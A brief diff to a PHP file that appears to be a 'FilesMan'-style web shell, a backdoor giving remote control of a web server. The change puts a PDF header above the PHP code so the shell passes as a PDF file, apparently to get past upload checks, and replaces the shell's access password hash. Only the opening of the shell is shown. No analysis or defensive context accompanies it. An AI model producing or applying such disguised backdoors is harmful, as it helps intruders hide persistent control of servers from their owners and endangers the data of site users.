@@ -1,3 +1,6 @@
+%PDF-1.4
+%âãÏÓ
+
 <?php
 session_start();
 @set_time_limit(0);
@@ -8,7 +11,7 @@ session_start();
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 
-$password = "4bdba3f2c612c2ee14568b1adf8f03bd"; //asu
+$password = "2612b168425798d34ee746e545d2f1f5"; //asu
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
